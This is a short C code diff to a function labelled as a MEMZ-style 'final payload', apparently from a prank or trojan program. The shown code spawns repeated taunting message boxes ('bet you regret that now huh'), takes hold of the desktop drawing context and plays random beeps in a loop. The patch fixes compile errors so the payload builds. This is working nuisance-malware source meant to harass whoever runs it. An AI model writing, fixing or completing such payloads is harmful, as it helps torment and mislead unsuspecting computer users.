@@ -38,6 +38,8 @@ int p1()
 
 int p2()
 { //memz final payload but random
+	HANDLE hmsg;
+	HDC desk;
 	fori(50)
 	{
 
@@ -50,10 +52,10 @@ int p2()
 		msg.lpszText = "bet you regret that now huh";
 		msg.lpszCaption = "ez";
 		msg.dwStyle = MB_YESNO | MB_ICONQUESTION;
-		HANDLE hmsg = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, 0, &dwID);
+		hmsg = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, 0, &dwID);
 
 		HWND desktop = GetDesktopWindow();
-		HDC desk = GetDC(NULL);
+		desk = GetDC(NULL);
 		RECT rect;
 		GetWindowRect(desktop, &rect);
 		int w = rect.right - rect.left;
@@ -69,7 +71,7 @@ int p2()
 
 		Beep(rand() % 30000, rand() % 1000);
 	}
-	CloseHandle(hmsg)
+	CloseHandle(hmsg);
 	ReleaseDC(NULL, desk);
 	return 0;
 }
